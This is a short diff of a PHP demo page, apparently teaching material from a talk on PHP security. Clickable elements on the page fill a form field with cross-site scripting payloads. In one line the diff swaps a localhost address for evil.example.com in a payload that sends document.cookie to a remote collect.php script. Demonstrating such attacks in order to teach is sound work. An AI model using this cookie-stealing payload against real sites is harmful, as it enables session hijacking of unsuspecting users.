@@ -52,7 +52,7 @@ if( isset($_POST['action']) ) {
 		<div><input type="submit"/></div>
 	</form>
 	<span onclick="$('#create_username').val('&quot;><script>alert(\'foo\')</script>');">1</span>
-	<span onclick="$('#create_username').val('&quot;><script>var i=new Image();i.src=\'http://localhost/talks/understanding-php/collect.php?cookie=\'+document.cookie</script>');">2</span>
+	<span onclick="$('#create_username').val('&quot;><script>var i=new Image();i.src=\'http://evil.example.com/collect.php?cookie=\'+document.cookie</script>');">2</span>
 </div>
 
 <div style="width: 49%; float: left">
